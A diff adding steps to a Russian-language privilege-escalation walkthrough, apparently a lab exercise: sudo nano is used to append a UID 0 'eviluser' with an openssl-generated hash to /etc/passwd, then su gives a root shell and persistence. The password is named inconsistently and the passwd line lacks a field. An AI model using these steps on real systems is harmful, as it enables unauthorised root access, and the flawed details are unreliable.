@@ -49,4 +49,16 @@
 
 5.  Мы видим, что мы можем через sudo использовать nano, и редактировать файлы с правами root. 
 Для повышения привилегий необходимо отредактировать файл /etc/passwd, создав своего пользователя с правами root. 
-Таким образом также осуществляется закрепление в системе
+Таким образом также осуществляется закрепление в системе. Для этого необходимо проделать следующие шаги:
+* На своем хосте сгенирируем хэш пароля evilpass для пользователя eviluser командой `openssl passwd -1 -salt eviluser evilpassword`
+
+![generate password for eviluser](/pictures/pic4.png)
+
+* Изменим внутри контейнера файл /etc/passwd используя nano `sudo nano /etc/passwd`. Добавим своего пользователя, добавив в конец файла строку: eviluser:$1$eviluser$eIaLEOmpQR3YjlJE1f/En.:0:0:/root/root:/bin/bash
+
+![add eviluser](/pictures/pic5.png)
+
+* Сохраним файл и откроем терминальную сессию для пользователя eviluser командой `su eviluser`, вводим пароль evilpassword. В итоге мы получаем сессию пользователя с правами root
+
+![su eviluser](/pictures/pic.png)
+
